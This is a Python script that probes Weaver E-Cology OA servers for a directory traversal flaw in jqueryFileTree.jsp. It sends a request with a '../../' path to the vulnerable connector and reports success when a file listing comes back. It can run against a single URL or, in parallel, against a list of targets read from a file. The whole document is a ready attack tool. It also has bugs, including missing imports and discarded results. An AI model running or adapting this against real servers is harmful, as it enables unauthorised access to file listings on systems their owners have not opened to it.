import time
import requests
import urllib3

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'
    success_msg = now_time() + ' [SUCCESS]存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞'
    shell_msg = now_time() + ':{}'.format(exp_url)
    warning_msg = now_time() + ' [WARNING]不存在泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞'
    error_msg = now_time() + '[泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code== 200 and 'index.jsp' in response.text:
            return success_msg,shell_msg
        else:
            return warning_msg
    except:
        return error_msg

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        print('error')